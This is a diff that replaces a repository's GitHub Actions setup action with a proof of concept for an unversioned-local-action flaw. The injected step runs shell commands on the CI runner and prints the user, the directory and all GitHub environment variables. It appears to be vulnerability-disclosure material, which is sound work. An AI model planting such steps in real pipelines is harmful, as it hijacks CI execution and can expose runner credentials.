@@ -1,28 +1,15 @@
-name: "Setup Environment"
-description: "Performs the repo setup including cloning, dependency installation, and node setup."
+name: "PoC Setup Action"
+description: "Proof of Concept for unversioned local action vulnerability"
 
 runs:
   using: "composite"
   steps:
-    - uses: actions/checkout@v4
-
-    - name: Cache turbo build setup
-      uses: actions/cache@v4
-      with:
-        path: .turbo
-        key: ${{ runner.os }}-turbo-${{ github.sha }}
-        restore-keys: |
-          ${{ runner.os }}-turbo-
-
-    - name: Install pnpm
-      uses: pnpm/action-setup@v4
-
-    - name: Use Node.js
-      uses: actions/setup-node@v4
-      with:
-        node-version: "20.x"
-        cache: "pnpm"
-
-    - name: Install dependencies
-      run: pnpm install --frozen-lockfile --child-concurrency=10
+    - name: Proof of Concept - Code Execution
       shell: bash
+      run: |
+        echo "==== EXPLOITATION PROOF START ===="
+        echo "Current user: $(whoami)"
+        echo "Current directory: $(pwd)"
+        echo "GitHub environment variables:"
+        env | grep -i github
+        echo "==== EXPLOITATION PROOF END ===="
